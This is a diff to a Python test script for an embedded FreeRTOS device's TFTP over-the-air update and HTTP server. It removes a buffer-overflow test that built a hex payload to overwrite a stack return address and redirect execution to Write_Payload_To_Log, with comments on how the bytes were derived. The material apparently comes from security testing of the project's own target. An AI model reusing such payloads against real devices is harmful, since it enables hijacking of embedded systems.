@@ -192,34 +192,6 @@ def deploymentTest(target):
     # on the HTTP server. We should get back 448 bytes (512 minus the 64 byte signature)
     HTTPSmokeTest(target, OtaFile, "ota512.htm", WEB_REPLY_OK, 5, 'Roundtrip OTA TC 4')
 
-
-    # attackString derived by printing the contents of the Stack in Receive_And_Process_One_OTA_Request
-    # JUST after the return address has been corrupted (manually) in ota.c
-    #
-    # The opening bytes are "lmcodemo.htm.sig" following by 0x6c which is just an arbitrary but legal
-    # NetASCII character. The final 5 bytes are
-    #   ec c8 01 c0 00
-    # which are:
-    #  1. The desired return address to overwrite the saved RA register on the stack. This should be the
-    #     address of the entry point of the Write_Payload_To_Log function(). Note this is little-endian
-    #     so the address seen in the FreeRTOS.asm file is 0xc001c8ec
-    #  2. A final 0x00 to make the whole thing a valid C string (so, for example, strlen() works on it...)
-    #
-    # PROBLEM: clientTftp.upload rejects this since bytes like 0xe0 and 0xc0 are NOT valid NetASCII subset
-    # as specified by RFC1350 for the filename part of the TFTP Write Request header.  This raises an
-    # exception in OTAHack() currently.
-    attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c\
- 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c\
- 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c \
-6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6\
-c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 ec c8 01 c0 00").decode("latin_1")
-    printAndLog ("Sending LM_ATTACK message via OTA.",doPrint=True,tee=getSetting('appLog'))
-    OTAHack(clientTftp, attackString, 5, 'OTA LMCODEMO')
-    printAndLog ("Sent LM_ATTACK message via OTA.",doPrint=True,tee=getSetting('appLog'))
-
-
-
-
     # uploading ota65535.htm.sig - just under the upper limit for our server.
     OTATest(clientTftp, "ota65535.htm.sig", 5, 'OTA just below max file size')
     HTTPSmokeTest(target, OtaFile, "ota65535.htm", WEB_REPLY_OK, 6, 'Roundtrip OTA TC 5')
